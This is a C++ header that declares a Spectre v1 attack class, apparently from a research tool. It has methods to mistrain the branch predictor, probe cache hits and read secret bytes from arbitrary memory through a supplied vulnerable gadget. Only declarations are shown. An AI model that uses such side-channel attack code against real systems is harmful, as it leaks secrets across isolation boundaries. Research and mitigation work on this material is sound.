//
// Created by sage on 1/13/21.
//

#ifndef CACHECASH_SPECTREV1_H
#define CACHECASH_SPECTREV1_H

#include <functional>

// void fn_vuln(size_t) is defined:
//      let k := *(p_base + x)
//      then p_scratchpad + k*block_len is brought into the cache
// Therefore, if we call fn_vuln(2), then we should see p_scratchpad + 2*block_len in the cache

//using fn_vuln_t = void(size_t);
//using fn_setup_t = void(void);
//using fn_make_legal_t = size_t(size_t);

class Spectrev1 {
public:
    inline Spectrev1(
            uint8_t *p_base,
            uint8_t  *p_scratchpad,
            std::function<void(size_t)> &&fn_vuln,
            std::function<void(void)> &&fn_setup,
            std::function<size_t(size_t)> &&fn_make_legal,
            size_t block_len,
            size_t n_max_tries,
            int n_trainings)
        : p_base(p_base),
          p_scratchpad(p_scratchpad),
          fn_vuln(fn_vuln),
          fn_setup(fn_setup),
          fn_make_legal(fn_make_legal),
          block_len(block_len),
          n_max_tries(n_max_tries),
          n_trainings(n_trainings)
    {}
    // Read a byte from p_secret into p_val
    void read_byte(void *p_secret, uint8_t *p_val);

    // Read n_bytes from p_secret and write it to p_buf
    // Require: At least n_bytes allocated from p_buf
    void read(void *p_secret, size_t n_bytes, uint8_t *p_buf);

private:
    void do_attack(size_t train_x, size_t mal_x);
    void mistrain(size_t train_x, size_t mal_x);
    void find_hits(size_t train_x);
    uint8_t *p_base;               // pointer to the base address from which we calc secret
    uint8_t *p_scratchpad;       // pointer to the address where we saving stuff
    std::function<void(size_t)> const fn_vuln;
    std::function<void(void)> const fn_setup;
    std::function<size_t(size_t)> const fn_make_legal;
    const size_t block_len;
    const size_t n_max_tries;
    const int n_trainings;

    // Index of the two blocks (p_scratchpad + high*block_len) with the highest number of hits
    int high;
    int high2;

    int results[MAX_BYTE];      // track hits in pBase
};


#endif //CACHECASH_SPECTREV1_H
